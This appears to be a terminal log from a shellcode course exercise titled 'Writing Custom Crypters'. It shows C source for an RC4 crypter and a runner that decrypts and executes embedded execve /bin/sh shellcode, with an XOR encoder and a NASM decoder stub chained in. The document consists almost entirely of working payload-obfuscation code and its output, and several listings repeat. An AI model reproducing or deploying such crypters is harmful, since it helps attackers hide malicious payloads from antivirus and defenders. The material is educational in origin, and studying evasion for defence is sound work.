@@ -1,0 +1,754 @@
+Writing Custom Crypters
+
+1.) Encrypting the shellcode using RC4
+dev@32:~/Desktop/Crypt$ cat -n RC4Crypter.c
+     1  /*
+     2          RC4 Crypter Implementation
+     3  */
+     4
+     5
+     6  #include<stdio.h>
+     7  #include<stdlib.h>
+     8  #include<string.h>
+     9
+    10
+    11  #define ARRAY_LENGTH    256
+    12  unsigned char s[ARRAY_LENGTH];
+    13  int rc4_i;
+    14  int rc4_j;
+    15
+    16  unsigned char shellcode[] = \
+    17  "\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";
+    18
+    19
+    20  swap(unsigned char *s1, unsigned char *s2)
+    21  {
+    22          char temp = *s1;
+    23
+    24          *s1 = *s2;
+    25          *s2 = temp;
+    26  }
+    27
+    28
+    29  int InitRC4(void)
+    30  {
+    31          int i;
+    32
+    33          for(i=0 ; i< ARRAY_LENGTH; i++)
+    34                  s[i] = i;
+    35
+    36          rc4_i = rc4_j = 0;
+    37
+    38          return 1;
+    39  }
+    40
+    41  int DoKSA(unsigned char *key, int key_len)
+    42  {
+    43
+    44          for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
+    45          {
+    46                  rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
+    47                  swap(&s[rc4_i], &s[rc4_j]);
+    48          }
+    49
+    50          // Reset counters for Prga
+    51
+    52          rc4_i = rc4_j = 0;
+    53
+    54  }
+    55
+    56
+    57  char GetPRGAOutput(void)
+    58  {
+    59          rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;
+    60
+    61          rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;
+    62
+    63          swap(&s[rc4_i], &s[rc4_j]);
+    64
+    65          return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
+    66  }
+    67
+    68
+    69  main(int argc, char **argv)
+    70  {
+    71          unsigned char *encryption_key;
+    72          int encryption_key_length;
+    73          unsigned char data_byte;
+    74          unsigned char keystream_byte;
+    75          unsigned char encrypted_byte;
+    76          int shellcode_len;
+    77          int counter;
+    78
+    79          encryption_key = (unsigned char *)argv[1];
+    80          encryption_key_length = strlen((char *)encryption_key);
+    81
+    82          if(encryption_key_length > ARRAY_LENGTH)
+    83          {
+    84                  printf("Key too large. should be <= 256 charachters\n");
+    85                  exit(-1);
+    86          }
+    87
+    88          InitRC4();
+    89          DoKSA(encryption_key, encryption_key_length);
+    90
+    91          shellcode_len = strlen(shellcode);
+    92          printf("Dumping RC4 Encrypted Shellcode\n\n\n\"");
+    93
+    94          for (counter=0; counter< shellcode_len; counter++)
+    95          {
+    96
+    97                  data_byte = shellcode[counter];
+    98
+    99                  keystream_byte = GetPRGAOutput();
+   100
+   101                  encrypted_byte = data_byte ^ keystream_byte;
+   102
+   103                  printf("\\x%02x", encrypted_byte);
+   104
+   105          }
+   106
+   107          printf("\"\n\n");
+   108          return 1;
+   109
+   110  }
+   111
+dev@32:~/Desktop/Crypt$ objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+dev@32:~/Desktop/Crypt$ ./execve-stack
+$
+$ exit
+dev@32:~/Desktop/Crypt$ nano RC4Crypter.c
+dev@32:~/Desktop/Crypt$ cat -n RC4Crypter.c
+     1  /*
+     2          RC4 Crypter Implementation
+     3  */
+     4
+     5
+     6  #include<stdio.h>
+     7  #include<stdlib.h>
+     8  #include<string.h>
+     9
+    10
+    11  #define ARRAY_LENGTH    256
+    12  unsigned char s[ARRAY_LENGTH];
+    13  int rc4_i;
+    14  int rc4_j;
+    15
+    16  unsigned char shellcode[] = \
+    17  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+    18
+    19  swap(unsigned char *s1, unsigned char *s2)
+    20  {
+    21          char temp = *s1;
+    22
+    23          *s1 = *s2;
+    24          *s2 = temp;
+    25  }
+    26
+    27
+    28  int InitRC4(void)
+    29  {
+    30          int i;
+    31
+    32          for(i=0 ; i< ARRAY_LENGTH; i++)
+    33                  s[i] = i;
+    34
+    35          rc4_i = rc4_j = 0;
+    36
+    37          return 1;
+    38  }
+    39
+    40  int DoKSA(unsigned char *key, int key_len)
+    41  {
+    42
+    43          for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
+    44          {
+    45                  rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
+    46                  swap(&s[rc4_i], &s[rc4_j]);
+    47          }
+    48
+    49          // Reset counters for Prga
+    50
+    51          rc4_i = rc4_j = 0;
+    52
+    53  }
+    54
+    55
+    56  char GetPRGAOutput(void)
+    57  {
+    58          rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;
+    59
+    60          rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;
+    61
+    62          swap(&s[rc4_i], &s[rc4_j]);
+    63
+    64          return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
+    65  }
+    66
+    67
+    68  main(int argc, char **argv)
+    69  {
+    70          unsigned char *encryption_key;
+    71          int encryption_key_length;
+    72          unsigned char data_byte;
+    73          unsigned char keystream_byte;
+    74          unsigned char encrypted_byte;
+    75          int shellcode_len;
+    76          int counter;
+    77
+    78          encryption_key = (unsigned char *)argv[1];
+    79          encryption_key_length = strlen((char *)encryption_key);
+    80
+    81          if(encryption_key_length > ARRAY_LENGTH)
+    82          {
+    83                  printf("Key too large. should be <= 256 charachters\n");
+    84                  exit(-1);
+    85          }
+    86
+    87          InitRC4();
+    88          DoKSA(encryption_key, encryption_key_length);
+    89
+    90          shellcode_len = strlen(shellcode);
+    91          printf("Dumping RC4 Encrypted Shellcode\n\n\n\"");
+    92
+    93          for (counter=0; counter< shellcode_len; counter++)
+    94          {
+    95
+    96                  data_byte = shellcode[counter];
+    97
+    98                  keystream_byte = GetPRGAOutput();
+    99
+   100                  encrypted_byte = data_byte ^ keystream_byte;
+   101
+   102                  printf("\\x%02x", encrypted_byte);
+   103
+   104          }
+   105
+   106          printf("\"\n\n");
+   107          return 1;
+   108
+   109  }
+   110
+dev@32:~/Desktop/Crypt$
+dev@32:~/Desktop/Crypt$ gcc RC4Crypter.c -o RC4Crypter
+dev@32:~/Desktop/Crypt$ ./RC4Crypter
+Segmentation fault (core dumped)
+dev@32:~/Desktop/Crypt$ ./RC4Crypter securitytube-slae
+Dumping RC4 Encrypted Shellcode
+
+
+"\xe0\xf8\x83\xfa\x51\x67\xfb\xf4\xa8\xac\x02\xbb\xfa\x71\x1a\xd4\xfc\x77\x7c\x08\xe8\x6e\x55\x2f\x69"
+
+dev@32:~/Desktop/Crypt$
+
+2.) Decrypting the RC4 shellcode
+dev@32:~/Desktop/Crypt$ cat -n RC4ExecuteShellcode.c
+     1  /*
+     2          RC4 Crypter Implementation
+     3  */
+     4
+     5
+     6  #include<stdio.h>
+     7  #include<stdlib.h>
+     8  #include<string.h>
+     9
+    10
+    11  #define ARRAY_LENGTH    256
+    12  unsigned char s[ARRAY_LENGTH];
+    13  int rc4_i;
+    14  int rc4_j;
+    15
+    16  unsigned char encrypted_shellcode[] = \
+    17  "\x57\xc4\x0d\x34\x7e\x94\xb0\x53\x6b\x1d\x22\xfd\x17\x12\xb4\x68\x60\xf5\xd1\x03\x95\x61\x03\xd1\xda\xb8\x1a\xd2\x45\xdc\x5e\xb0\x28\x89\xa6\xee\xfa\xeb\xa5\x20\x98\xfe\x43\xf5\xcb";
+    18
+    19  swap(unsigned char *s1, unsigned char *s2)
+    20  {
+    21          char temp = *s1;
+    22
+    23          *s1 = *s2;
+    24          *s2 = temp;
+    25  }
+    26
+    27
+    28  int InitRC4(void)
+    29  {
+    30          int i;
+    31
+    32          for(i=0 ; i< ARRAY_LENGTH; i++)
+    33                  s[i] = i;
+    34
+    35          rc4_i = rc4_j = 0;
+    36
+    37          return 1;
+    38  }
+    39
+    40  int DoKSA(unsigned char *key, int key_len)
+    41  {
+    42
+    43          for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
+    44          {
+    45                  rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
+    46                  swap(&s[rc4_i], &s[rc4_j]);
+    47          }
+    48
+    49          // Reset counters for Prga
+    50
+    51          rc4_i = rc4_j = 0;
+    52
+    53  }
+    54
+    55
+    56  char GetPRGAOutput(void)
+    57  {
+    58          rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;
+    59
+    60          rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;
+    61
+    62          swap(&s[rc4_i], &s[rc4_j]);
+    63
+    64          return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
+    65  }
+    66
+    67
+    68  main(int argc, char **argv)
+    69  {
+    70          unsigned char *encryption_key;
+    71          int encryption_key_length;
+    72          unsigned char data_byte;
+    73          int encrypted_shellcode_len;
+    74          int counter;
+    75          int (*ret)() = (int(*)())encrypted_shellcode;
+    76
+    77
+    78          encryption_key = (unsigned char *)argv[1];
+    79          encryption_key_length = strlen((char *)encryption_key);
+    80
+    81          if(encryption_key_length > ARRAY_LENGTH)
+    82          {
+    83                  printf("Key too large. should be <= 256 charachters\n");
+    84                  exit(-1);
+    85          }
+    86
+    87          InitRC4();
+    88          DoKSA(encryption_key, encryption_key_length);
+    89
+    90          encrypted_shellcode_len = strlen(encrypted_shellcode);
+    91          printf("Decrypting Shellcode ....Running it now...\n\n\n\"");
+    92
+    93          for (counter=0; counter< encrypted_shellcode_len; counter++)
+    94          {
+    95                  encrypted_shellcode[counter] ^= GetPRGAOutput();
+    96          }
+    97
+    98          ret();
+    99
+   100          printf("\"\n\n");
+   101          return 1;
+   102
+   103  }
+   104
+dev@32:~/Desktop/Crypt$
+dev@32:~/Desktop/Crypt$ cat -n RC4ExecuteShellcode.c
+     1  /*
+     2          RC4 Crypter Implementation
+     3  */
+     4
+     5
+     6  #include<stdio.h>
+     7  #include<stdlib.h>
+     8  #include<string.h>
+     9
+    10
+    11  #define ARRAY_LENGTH    256
+    12  unsigned char s[ARRAY_LENGTH];
+    13  int rc4_i;
+    14  int rc4_j;
+    15
+    16  unsigned char encrypted_shellcode[] = \
+    17  "\xe0\xf8\x83\xfa\x51\x67\xfb\xf4\xa8\xac\x02\xbb\xfa\x71\x1a\xd4\xfc\x77\x7c\x08\xe8\x6e\x55\x2f\x69";
+    18
+    19  swap(unsigned char *s1, unsigned char *s2)
+    20  {
+    21          char temp = *s1;
+    22
+    23          *s1 = *s2;
+    24          *s2 = temp;
+    25  }
+    26
+    27
+    28  int InitRC4(void)
+    29  {
+    30          int i;
+    31
+    32          for(i=0 ; i< ARRAY_LENGTH; i++)
+    33                  s[i] = i;
+    34
+    35          rc4_i = rc4_j = 0;
+    36
+    37          return 1;
+    38  }
+    39
+    40  int DoKSA(unsigned char *key, int key_len)
+    41  {
+    42
+    43          for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
+    44          {
+    45                  rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
+    46                  swap(&s[rc4_i], &s[rc4_j]);
+    47          }
+    48
+    49          // Reset counters for Prga
+    50
+    51          rc4_i = rc4_j = 0;
+    52
+    53  }
+    54
+    55
+    56  char GetPRGAOutput(void)
+    57  {
+    58          rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;
+    59
+    60          rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;
+    61
+    62          swap(&s[rc4_i], &s[rc4_j]);
+    63
+    64          return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
+    65  }
+    66
+    67
+    68  main(int argc, char **argv)
+    69  {
+    70          unsigned char *encryption_key;
+    71          int encryption_key_length;
+    72          unsigned char data_byte;
+    73          int encrypted_shellcode_len;
+    74          int counter;
+    75          int (*ret)() = (int(*)())encrypted_shellcode;
+    76
+    77
+    78          encryption_key = (unsigned char *)argv[1];
+    79          encryption_key_length = strlen((char *)encryption_key);
+    80
+    81          if(encryption_key_length > ARRAY_LENGTH)
+    82          {
+    83                  printf("Key too large. should be <= 256 charachters\n");
+    84                  exit(-1);
+    85          }
+    86
+    87          InitRC4();
+    88          DoKSA(encryption_key, encryption_key_length);
+    89
+    90          encrypted_shellcode_len = strlen(encrypted_shellcode);
+    91          printf("Decrypting Shellcode ....Running it now...\n\n\n\"");
+    92
+    93          for (counter=0; counter< encrypted_shellcode_len; counter++)
+    94          {
+    95                  encrypted_shellcode[counter] ^= GetPRGAOutput();
+    96          }
+    97
+    98          ret();
+    99
+   100          printf("\"\n\n");
+   101          return 1;
+   102
+   103  }
+   104
+dev@32:~/Desktop/Crypt$
+dev@32:~/Desktop/Crypt$ gcc -fno-stack-protector -z execstack RC4ExecuteShellcode.c -o RC4ExecuteShellcode
+dev@32:~/Desktop/Crypt$ ./RC4ExecuteShellcode
+Segmentation fault (core dumped)
+dev@32:~/Desktop/Crypt$ ./RC4ExecuteShellcode demokey
+Decrypting Shellcode ....Running it now...
+
+
+Segmentation fault (core dumped)
+dev@32:~/Desktop/Crypt$ ./RC4ExecuteShellcode securitytube-slae
+Decrypting Shellcode ....Running it now...
+
+
+$
+$ exit
+dev@32:~/Desktop/Crypt$
+
+3.) Chaining Methods
+dev@32:~/Desktop/Crypt$ objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+dev@32:~/Desktop/Crypt$ nano XOREncoder.py
+dev@32:~/Desktop/Crypt$ ./XOREncoder.py
+Encoded shellcode ...
+\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a
+0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,
+Len: 25
+dev@32:~/Desktop/Crypt$ nano xor-decoder.nasm
+dev@32:~/Desktop/Crypt$ cat -n xor-decoder.nasm
+     1  ; Filename: xor-decoder.nasm
+     2
+     3  global _start
+     4
+     5  section .text
+     6  _start:
+     7
+     8          jmp short call_decoder
+     9
+    10  decoder:
+    11          pop esi
+    12          xor ecx, ecx
+    13          mov cl, 25
+    14
+    15
+    16  decode:
+    17          xor byte [esi], 0xAA
+    18          inc esi
+    19          loop decode
+    20
+    21          jmp short Shellcode
+    22
+    23
+    24
+    25  call_decoder:
+    26
+    27          call decoder
+    28          Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
+    29
+dev@32:~/Desktop/Crypt$ ./compile.sh xor-decoder
+[+] Assembling with Nasm ...
+[+] Linking ...
+[+] Done!
+dev@32:~/Desktop/Crypt$ objdump -d ./xor-decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
+dev@32:~/Desktop/Crypt$ nano RC4Crypter.c
+dev@32:~/Desktop/Crypt$ cat -n RC4Crypter.c
+     1  /*
+     2          RC4 Crypter Implementation
+     3  */
+     4
+     5
+     6  #include<stdio.h>
+     7  #include<stdlib.h>
+     8  #include<string.h>
+     9
+    10
+    11  #define ARRAY_LENGTH    256
+    12  unsigned char s[ARRAY_LENGTH];
+    13  int rc4_i;
+    14  int rc4_j;
+    15
+    16  unsigned char shellcode[] = \
+    17  "\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";
+    18
+    19  swap(unsigned char *s1, unsigned char *s2)
+    20  {
+    21          char temp = *s1;
+    22
+    23          *s1 = *s2;
+    24          *s2 = temp;
+    25  }
+    26
+    27
+    28  int InitRC4(void)
+    29  {
+    30          int i;
+    31
+    32          for(i=0 ; i< ARRAY_LENGTH; i++)
+    33                  s[i] = i;
+    34
+    35          rc4_i = rc4_j = 0;
+    36
+    37          return 1;
+    38  }
+    39
+    40  int DoKSA(unsigned char *key, int key_len)
+    41  {
+    42
+    43          for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
+    44          {
+    45                  rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
+    46                  swap(&s[rc4_i], &s[rc4_j]);
+    47          }
+    48
+    49          // Reset counters for Prga
+    50
+    51          rc4_i = rc4_j = 0;
+    52
+    53  }
+    54
+    55
+    56  char GetPRGAOutput(void)
+    57  {
+    58          rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;
+    59
+    60          rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;
+    61
+    62          swap(&s[rc4_i], &s[rc4_j]);
+    63
+    64          return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
+    65  }
+    66
+    67
+    68  main(int argc, char **argv)
+    69  {
+    70          unsigned char *encryption_key;
+    71          int encryption_key_length;
+    72          unsigned char data_byte;
+    73          unsigned char keystream_byte;
+    74          unsigned char encrypted_byte;
+    75          int shellcode_len;
+    76          int counter;
+    77
+    78          encryption_key = (unsigned char *)argv[1];
+    79          encryption_key_length = strlen((char *)encryption_key);
+    80
+    81          if(encryption_key_length > ARRAY_LENGTH)
+    82          {
+    83                  printf("Key too large. should be <= 256 charachters\n");
+    84                  exit(-1);
+    85          }
+    86
+    87          InitRC4();
+    88          DoKSA(encryption_key, encryption_key_length);
+    89
+    90          shellcode_len = strlen(shellcode);
+    91          printf("Dumping RC4 Encrypted Shellcode\n\n\n\"");
+    92
+    93          for (counter=0; counter< shellcode_len; counter++)
+    94          {
+    95
+    96                  data_byte = shellcode[counter];
+    97
+    98                  keystream_byte = GetPRGAOutput();
+    99
+   100                  encrypted_byte = data_byte ^ keystream_byte;
+   101
+   102                  printf("\\x%02x", encrypted_byte);
+   103
+   104          }
+   105
+   106          printf("\"\n\n");
+   107          return 1;
+   108
+   109  }
+   110
+dev@32:~/Desktop/Crypt$ gcc RC4Crypter.c -o RC4Crypter
+dev@32:~/Desktop/Crypt$ ./RC4Crypter
+Segmentation fault (core dumped)
+dev@32:~/Desktop/Crypt$ ./RC4Crypter securitytube
+Dumping RC4 Encrypted Shellcode
+
+
+"\x57\xc4\x0d\x34\x7e\x94\xb0\x53\x6b\x1d\x22\xfd\x17\x12\xb4\x68\x60\xf5\xd1\x03\x95\x61\x03\xd1\xda\xb8\x1a\xd2\x45\xdc\x5e\xb0\x28\x89\xa6\xee\xfa\xeb\xa5\x20\x98\xfe\x43\xf5\xcb"
+
+dev@32:~/Desktop/Crypt$ nano RC4ExecuteShellcode.c
+dev@32:~/Desktop/Crypt$ cat -n RC4ExecuteShellcode.c
+     1  /*
+     2          RC4 Crypter Implementation
+     3  */
+     4
+     5
+     6  #include<stdio.h>
+     7  #include<stdlib.h>
+     8  #include<string.h>
+     9
+    10
+    11  #define ARRAY_LENGTH    256
+    12  unsigned char s[ARRAY_LENGTH];
+    13  int rc4_i;
+    14  int rc4_j;
+    15
+    16  unsigned char encrypted_shellcode[] = \
+    17  "\x57\xc4\x0d\x34\x7e\x94\xb0\x53\x6b\x1d\x22\xfd\x17\x12\xb4\x68\x60\xf5\xd1\x03\x95\x61\x03\xd1\xda\xb8\x1a\xd2\x45\xdc\x5e\xb0\x28\x89\xa6\xee\xfa\xeb\xa5\x20\x98\xfe\x43\xf5\xcb";
+    18
+    19  swap(unsigned char *s1, unsigned char *s2)
+    20  {
+    21          char temp = *s1;
+    22
+    23          *s1 = *s2;
+    24          *s2 = temp;
+    25  }
+    26
+    27
+    28  int InitRC4(void)
+    29  {
+    30          int i;
+    31
+    32          for(i=0 ; i< ARRAY_LENGTH; i++)
+    33                  s[i] = i;
+    34
+    35          rc4_i = rc4_j = 0;
+    36
+    37          return 1;
+    38  }
+    39
+    40  int DoKSA(unsigned char *key, int key_len)
+    41  {
+    42
+    43          for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
+    44          {
+    45                  rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
+    46                  swap(&s[rc4_i], &s[rc4_j]);
+    47          }
+    48
+    49          // Reset counters for Prga
+    50
+    51          rc4_i = rc4_j = 0;
+    52
+    53  }
+    54
+    55
+    56  char GetPRGAOutput(void)
+    57  {
+    58          rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;
+    59
+    60          rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;
+    61
+    62          swap(&s[rc4_i], &s[rc4_j]);
+    63
+    64          return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
+    65  }
+    66
+    67
+    68  main(int argc, char **argv)
+    69  {
+    70          unsigned char *encryption_key;
+    71          int encryption_key_length;
+    72          unsigned char data_byte;
+    73          int encrypted_shellcode_len;
+    74          int counter;
+    75          int (*ret)() = (int(*)())encrypted_shellcode;
+    76
+    77
+    78          encryption_key = (unsigned char *)argv[1];
+    79          encryption_key_length = strlen((char *)encryption_key);
+    80
+    81          if(encryption_key_length > ARRAY_LENGTH)
+    82          {
+    83                  printf("Key too large. should be <= 256 charachters\n");
+    84                  exit(-1);
+    85          }
+    86
+    87          InitRC4();
+    88          DoKSA(encryption_key, encryption_key_length);
+    89
+    90          encrypted_shellcode_len = strlen(encrypted_shellcode);
+    91          printf("Decrypting Shellcode ....Running it now...\n\n\n\"");
+    92
+    93          for (counter=0; counter< encrypted_shellcode_len; counter++)
+    94          {
+    95                  encrypted_shellcode[counter] ^= GetPRGAOutput();
+    96          }
+    97
+    98          ret();
+    99
+   100          printf("\"\n\n");
+   101          return 1;
+   102
+   103  }
+   104
+dev@32:~/Desktop/Crypt$ gcc -fno-stack-protector -z execstack RC4ExecuteShellcode.c -o RC4ExecuteShellcode
+dev@32:~/Desktop/Crypt$ ./RC4ExecuteShellcode securitytube
+Decrypting Shellcode ....Running it now...
+
+
+$
+$ exit
+dev@32:~/Desktop/Crypt$
